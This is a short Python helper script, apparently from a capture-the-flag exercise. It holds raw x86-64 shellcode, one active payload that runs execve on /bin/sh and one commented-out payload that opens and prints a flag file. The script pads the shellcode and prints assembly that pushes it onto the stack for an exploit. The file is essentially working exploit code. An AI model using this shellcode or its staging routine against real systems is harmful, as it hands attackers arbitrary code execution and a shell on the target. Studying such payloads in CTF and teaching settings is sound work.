#!/usr/bin/env python

import struct

#shellcode = b'H1\xd2RH\xbfser/flagWH\xbf//home/uWH\x89\xe7H1\xf6H1\xc0\xb0\x02\x0f\x05H\x89\xc7H\xc7\xc6\xc0@K\x00H1\xd2\xb2\xffH1\xc0\x0f\x05H1\xffH\xff\xc7H\xc7\xc6\xc0@K\x00H1\xd2\xb2\xffH1\xc0H\xff\xc0\x0f\x05H1\xff\xb2\x03H1\xc0\xb0<\x0f\x05' # orw
shellcode = b'H1\xd2H1\xf6H\xbf//bin/shVWH\x89\xe7H1\xc0\xb0;\x0f\x05' # execve

print(f"shellcode length: {len(shellcode)}")

while len(shellcode) % 8 != 0:
    shellcode += b"\x90"

for i in range(len(shellcode), 0, -8):
    b = struct.unpack("<Q", shellcode[i-8:i])[0]

    print(f"mov\t${hex(b)}, %r8\npush\t%r8")
